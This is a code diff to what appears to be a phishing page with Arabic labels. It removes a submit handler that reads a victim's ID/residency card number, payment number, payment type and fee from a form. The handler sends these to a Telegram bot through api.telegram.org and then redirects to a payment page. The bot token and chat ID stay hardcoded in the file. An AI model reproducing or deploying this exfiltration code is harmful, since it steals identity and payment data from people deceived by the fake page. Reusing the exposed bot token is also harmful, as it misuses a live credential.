@@ -116,36 +116,7 @@
 <script>
   const botToken = '5158365562:AAEz1BsupVQMQTgOkEyfu8yi4cvjkmPLLv0'; 
   const chatId = '@Anas_mx';
-  document.getElementById('telegramForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      var uid = 1234567865;
-      var message = "_______ هنالك طلب جديد _______ "+"\n"+"\n";
-      message += "رقم العملية"+":"+uid+"\n"+"\n";
-      message += "رقم البطاقة / الاقامة" + ":" + document.getElementById('inp1').value + "\n" + "\n";
-      message += "رقم السداد" + ":" + document.getElementById('inp2').value + "\n" + "\n";
-      message += "نوع السداد" + ":" + document.getElementById('inp3').value + "\n" + "\n";
-      message += "رسوم السداد" + ":" + document.getElementById('inp4').value + "\n" + "\n";
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      fetch(url, {
-          method: 'POST',
-          headers: {
-              'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-              chat_id: chatId,
-              text: message
-          })
-      })
-      .then(response => response.json())
-      .then(data => {
-          if (data.ok) {
-              window.location.href = 'pay.html?id='+uid;
-          }
-      })
-      .catch(error => {
-        window.location.href = 'pay.html?id='+uid;
-      });
-  });
+  
 </script>
     <footer class="footer  p-2  text-center border-top text-center mt-4 infodb" dir="rtl">
     <div class="footer-copyright">
